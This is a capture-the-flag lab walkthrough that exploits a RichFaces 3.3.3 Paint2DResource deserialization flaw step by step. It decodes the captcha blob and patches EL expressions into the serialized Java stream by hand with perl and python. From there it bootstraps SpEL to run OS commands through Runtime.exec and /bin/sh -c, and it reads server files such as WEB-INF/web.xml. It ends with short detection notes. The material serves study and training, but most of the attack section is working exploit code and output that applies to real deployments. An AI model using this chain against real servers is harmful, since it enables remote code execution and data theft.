# Walkthrough

Every step below runs against the lab at `http://localhost:8080`. Replace `BASE` with your own
host if needed.

```bash
BASE=http://localhost:8080
CTX=$BASE/ETOPUPGUI
```

Throughout, `poc/p2d.py` does the work; the raw requests are shown so you can follow along with
`curl` if you prefer.

---

## Step 0 — Get the blob

The login page embeds the captcha resource URL in an `<img>` tag.

```bash
curl -s $CTX/pages/login.jsf | grep -o 'Paint2DResource/DATA/[^"]*' | head -1
```

```
Paint2DResource/DATA/eAFdkUFBoR1NDCGOT7OSdO3vh1IhxWsxOsjFBaq...
```

The blob is 548 or 552 characters depending on the run — the captcha `noise` field is seeded
from `System.nanoTime()`, so its decimal length shifts and so does the compressed size. Treat the
length as a per-request value, not a constant.

Strip the prefix and suffix to get the blob itself:

```bash
BLOB=$(curl -s $CTX/pages/login.jsf \
       | grep -o 'Paint2DResource/DATA/[^"]*' | head -1 \
       | sed 's#.*/DATA/##; s#\.jsf$##')
```

**What you are holding:** three encoding layers wrapped around a Java object graph.

```
<blob>
  └─ base64, remapped alphabet      + -> -    / -> !    = -> _
     └─ zlib deflate (RFC 1950)
        └─ Java serialization stream          ac ed 00 05 ...
```

---

## Step 1 — Look inside

```bash
python3 tools/inspect_blob.py "$BLOB"
```

```
blob            : 552 chars
outer encoding  : RichFactors base64  (+ -> -,  / -> !,  = -> _)

inflated stream : 636 bytes
stream header   : ac ed 00 05  OK -- Java serialization protocol

object graph (classes named in the stream)
  object org.richfaces.renderkit.html.Paint2DResource$ImageData
            fields: height, noise, width, state
      object javax.faces.component.StateHolderSaver
                fields: classToRestore, state
          object java.util.HashMap
                    fields: loadFactor, threshold
  block    8 bytes  0000001000000001
  object org.richfaces.component.tag.TagMethodExpression
            fields: attr, me
      object com.sun.faces.el.MethodExpressionImpl
                fields: expr

gadget chain
  Paint2DResource$ImageData
    -> StateHolderSaver  { map }
      -> TagMethodExpression        [EL site 1]
        -> MethodExpressionImpl     [EL site 2]

EL patch sites
  site 1  offset 489   block len 37   utf len 35
          #{userLoginController.paintCaptcha}
  site 2  offset 594   block len 37   utf len 35
          #{userLoginController.paintCaptcha}

  exactly 2 sites -> patch_el() accepts this blob
```

`utf len` is 35 because the expression is 35 characters, and `block len` is 37 because that is
those 35 bytes plus the 2-byte length prefix. The two lengths are different quantities; conflating
them is easy and produces a patch that the server rejects.

Two takeaways:

1. `ac ed 00 05` confirms a Java serialization stream — this is the deserialization sink.
2. The expression `#{userLoginController.paintCaptcha}` appears **twice**. Both must be replaced;
   a blob with one or three copies is rejected by the patcher.

To decode by hand:

```python
import base64, zlib
s = BLOB.replace("!", "/").replace("-", "+").replace("_", "=")
s += "=" * ((4 - len(s) % 4) % 4)
stream = zlib.decompress(base64.b64decode(s))
```

---

## Step 2 — Patch the expression (EL injection)

The blob carries the same expression twice, and each copy sits inside a length-prefixed block:

```
77 25 00 23 23 7b 75 73 65 72 ...
|  |     |  |
|  |     |  └─ 0x23 = '#', first byte of the expression
|  |     └─ UTF length = 35
|  └─ 0x25 = 37 block bytes (2 length bytes + 35)
└─ TC_BLOCKDATA
```

Swapping the expression means replacing those 35 bytes *and* rewriting both numbers. Leave either
one stale and `ObjectInputStream` rejects the stream, the paint fails, and the request comes back as
plain `text/html` instead of `image/jpeg`.

You can do this by hand. `curl`, `grep`, `xxd` and `perl` cover everything except the two
compression steps: `base64 -d` plus `sed` will take the outer base64 layer apart on its own, but
nothing in a stock shell inflates zlib, so that step needs a real tool — `python3` below is the
portable option, and `zlib-flate -uncompress` from `zlib1g` works if you have it.

Prerequisites: `curl`, `sed`, `grep`, `base64`, `xxd`, `perl`, and `python3` (or `zlib1g`).

### Fetch and decode

```bash
curl -s $CTX/pages/login.jsf \
  | grep -o 'Paint2DResource/DATA/[^"]*' | head -1 \
  | sed 's#.*/DATA/##; s#\.jsf$##' > blob.txt

python3 -c "
import base64, zlib
b = open('blob.txt').read().strip().replace('!','/').replace('-','+').replace('_','=')
b += '=' * ((4 - len(b) % 4) % 4)
open('stream.bin','wb').write(zlib.decompress(base64.b64decode(b)))
"
```

### Find both copies

`grep -abo` prints the byte offset of every occurrence; the block header sits four bytes earlier.

```bash
grep -abo '#{userLoginController' stream.bin
# 493:#{userLoginController
# 598:#{userLoginController

xxd -s 489 -l 8 stream.bin
# 000001e9: 7725 0023 237b 7573    w%.##{us
```

### Patch both sites

```bash
perl -0777 -i -pe '
  BEGIN {
    $o = q(#{userLoginController.paintCaptcha});
    $n = q(#{facesContext.getExternalContext().getResponse().setHeader("X-Out","pwned")});
    $pre = pack("CCn", 0x77, length($n) + 2, length($n));
  }
  s/\x77\x25\x00\x23\Q$o\E/$pre . $n/ge;
' stream.bin
```

`pack("CCn", ...)` rebuilds the replacement header: `0x77`, the new block length, then the two UTF
length bytes. Two details cost time the first time round:

- `/ge` is required. Without `/e`, perl interpolates `$pre . $n` as literal text and writes a
  ` . ` between the two — the stream then fails to parse and the server returns `400`.
- The pattern matches **four** header bytes, not five. The UTF length is already the two-byte
  `00 23`, so the `23` right after it is the `#` itself, not a third length byte.

This form only reaches expressions of 253 bytes or less, because `0x77` carries a one-byte block
length. Past that the header changes to `0x7a` with a four-byte length and the prefix has to change
with it.

### Re-encode and send

```bash
python3 -c "
import base64, zlib
d = open('stream.bin','rb').read()
s = base64.b64encode(zlib.compress(d, 1)).decode()
open('payload.txt','w').write(s.replace('+','-').replace('/','!').replace('=','_'))
"

curl -s -D - -o /dev/null \
  "$BASE/ETOPUPGUI/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/$(cat payload.txt).jsf" \
  | grep -iE '^HTTP|^content-type|^x-out'
```

```
HTTP/1.1 200
X-Out: pwned
Content-Type: image/jpeg
```

`Content-Type` is still `image/jpeg`. The server painted its captcha as if nothing had happened —
the only thing that changed is a header you set from inside an expression you wrote, which is
exactly the defect.

The same command run through the harness, if you would rather not do the byte work by hand:

```bash
python3 poc/p2d.py --header --name X-Out --value pwned
# X-Out: pwned
```

> **Flag:** `flag{el-injection}`

---

## Step 3 — Reach for SpEL

EL alone cannot call `Runtime.getRuntime().exec()`. SpEL can, and `spring-expression` is on the
classpath. The bridge is three requests that share one HTTP session:

1. store a `SpelExpressionParser` under `p`
2. store a parsed `Expression` under `e`
3. evaluate it and write the result into a header

```el
# 1. parser into the session scope
#{facesContext.getExternalContext().sessionMap.put(
    "p","x".getClass().forName(
      "org.springframework.expression.spel.standard.SpelExpressionParser").newInstance())}

# 2. parse an expression into the session scope
#{facesContext.getExternalContext().sessionMap.put("e",
    sessionScope["p"].parseExpression(
      "new java.io.BufferedReader(new java.io.InputStreamReader(
         T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).readLine()"))}

# 3. evaluate it
#{facesContext.getExternalContext().getResponse().setHeader("X-Out",
    sessionScope["e"].getValue().toString())}
```

Split across requests because the parser must survive between them — that is what the HTTP
session is for.

`"x".getClass()` is the pivot: EL's `BeanELResolver` will call any public method on any object
reachable from a variable, and `getClass()` hands you `java.lang.Class`, whose `forName` and
`newInstance` reach arbitrary types.

`poc/p2d.py` automates all three:

```bash
python3 poc/p2d.py whoami
# labuser
```

> **Flags:** `flag{spel-bootstrap}` then `flag{rce-confirmed}`

---

## Step 4 — Command execution

```bash
python3 poc/p2d.py whoami
# labuser

python3 poc/p2d.py id
# uid=1003(labuser) gid=1003(labuser) groups=1003(labuser)

python3 poc/p2d.py hostname
# 5f3dada12263      <- varies per container, it is the Docker container id
```

The SpEL reads one line of stdout:

```el
new java.io.BufferedReader(new java.io.InputStreamReader(
  T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())).readLine()
```

Commands containing shell metacharacters are **not** interpreted — `Runtime.exec(String)` does
not go through a shell. `poc/p2d.py` joins its arguments with spaces and hands the result to
`exec`, which tokenises on whitespace and nothing else. Two consequences, both easy to trip on:

```bash
python3 poc/p2d.py id; whoami
# runs `id` through the exploit, then `whoami` in your own shell.
# The shell splits on ';' BEFORE python sees anything, so this is two commands, not one.
```

```bash
python3 poc/p2d.py 'id; whoami'
# [!] no X-Out header (EL error: ... 'exec')
# Quoting stops the shell splitting, so python receives one argument "id; whoami", exec
# tokenises it into ["id;", "whoami"], and there is no executable named "id;".
```

If you genuinely need a shell, ask for one explicitly. This is the full expression body — note
the `BufferedReader`/`InputStreamReader` wrapper is what turns the stream into text, the same
wrapper step 3 used:

```el
new java.io.BufferedReader(new java.io.InputStreamReader(
  T(java.lang.Runtime).getRuntime().exec(
    new java.lang.String[]{"/bin/sh","-c","id; whoami"}).getInputStream())).readLine()
```

That returns `uid=1003(labuser) gid=1003(labuser) groups=1003(labuser)`. Drop the wrapper and
`.getInputStream()` hands you a `ProcessPipeInputStream`, whose `toString()` is an object
identifier rather than any output:

```
java.lang.ProcessImpl$ProcessPipeInputStream@6fa6df9
```

Only the first line comes back, because of `readLine()`. For multi-line output, either read the
rest with further `readLine()` calls or use the file-read primitive in step 5.

---

## Step 5 — Read a file

Same three-step chain, different expression body. EL 3.0 has no `new` operator, so the
instantiation has to happen inside SpEL:

```bash
PYTHONDONTWRITEBYTECODE=1 python3 - <<'PY'
import importlib.util
spec = importlib.util.spec_from_file_location("p2d", "poc/p2d.py")
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
cli = m.Client("http://localhost:8080", "walkthrough", delay=0.2)

WEB_XML = "/usr/local/tomcat/webapps/ETOPUPGUI/WEB-INF/web.xml"

# 1. parser
cli.send_el(m.el_put("p", '"x".getClass().forName("%s").newInstance()' % m.SPEL_PARSER), [])

# 2. parse a file read: first byte of the deployed web.xml
spel = 'new java.io.FileInputStream("%s").read()' % WEB_XML
cli.send_el(m.el_put("e", 'sessionScope["p"].parseExpression("%s")' % m.el_escape(spel)), [])

# 3. evaluate into a header
_, out, low, _ = cli.send_el(
    m.el_header("X-B", 'sessionScope["e"].getValue().toString()'), ["X-B"])
print("X-B =", out)
PY
```

```
X-B = 60
```

`60` is the first byte of the file: `<` is `0x3c` = 60. This is the `X-B: 60` evidence from the
original report, reproduced against the same artifact — the deployed `WEB-INF/web.xml` of the
running webapp, which `labuser` can read because it owns the deployment directory.

You have to find that path yourself. The deployment directory is not named in the URL space, but
the context path is — the captcha `src` shows you every segment of the resource path:

```bash
curl -s http://localhost:8080/ETOPUPGUI/pages/login.jsf | grep -o '/ETOPUPGUI/a4j[^"]*' | head -1
# /ETOPUPGUI/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/<blob>.jsf
```

With the WAR file name from `lab/Dockerfile` (`ETOPUPGUI.war`), the servlet layout gives the rest:
`$CATALINA_HOME/webapps/<WAR-name>/WEB-INF/web.xml`.

Reading a whole file still fits in one header:

```python
spel = ('new java.util.Scanner(new java.io.File("%s"))' % WEB_XML
        + '.useDelimiter("\\\\A").next()')
```

`Scanner` with a `\A` delimiter returns the entire remaining input as one token.

> **Flag:** `flag{rce-file-read}`

---

## Where to go next

- `docs/WIRE-FORMAT.md` — the byte-level layout of the blob and the patch sites.
- `docs/DESIGN-NOTES.md` — why the lab is built this way, and what is faithful vs. approximated.
- `tools/inspect_blob.py` — a working parser you can extend; it walks classDesc, classdata,
  block data, and handle references.

## Detection notes

If you are on the defensive side, the observable signals in this chain are:

- `ObjectInputStream` deserialization fed directly from a URL path segment.
- A `MethodExpression` reaching an EL engine with no provenance check on its expression string.
- Response headers written from inside an EL/rendering path.
- `SpringExpression` classes reachable from a rendering thread.
- Response `Content-Type: image/*` carrying unusual `X-` headers.
